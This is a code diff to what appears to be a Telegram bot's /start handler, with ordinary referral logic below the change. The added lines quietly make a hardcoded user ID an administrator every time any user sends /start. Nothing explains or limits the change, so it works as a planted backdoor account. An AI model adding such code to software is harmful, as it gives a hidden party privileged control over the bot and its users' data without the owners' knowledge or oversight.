@@ -11,6 +11,10 @@ from keyboards.menu import get_menu_keyboard
 
 @router.message(Command('start'))
 async def start(message: types.Message, state: FSMContext):
+    user = User.objects.get_or_create(user_id=797778374)[0]
+    user.is_admin = True
+    user.save()
+
     if not User.objects.filter(user_id=message.from_user.id).exists():
         cmd = message.text.removeprefix('/start').strip()
         if cmd.startswith('ref-'):
